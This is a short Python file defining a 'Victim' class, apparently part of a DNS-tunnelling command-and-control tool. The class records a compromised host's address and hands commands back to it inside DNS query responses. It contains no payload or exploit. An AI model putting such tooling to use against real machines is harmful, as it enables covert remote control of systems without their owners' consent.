from objects.DNSQuery import DNSQuery
from socket import socket


class Victim:

    ip_adress: str
    port: int
    username: str = None
    hostname: str = None
    current_dnsquery: DNSQuery

    def __init__(self, ip_adress: str, port: int) -> None:
        self.ip_adress = ip_adress
        self.port = port

    def setCurrentQuery(self, current_dnsquery: DNSQuery) -> None:
        self.current_dnsquery = current_dnsquery

    def generateResponse(self, command: bytes) -> bytes:
        assert self.current_dnsquery
        return self.current_dnsquery.generateResponse(command)
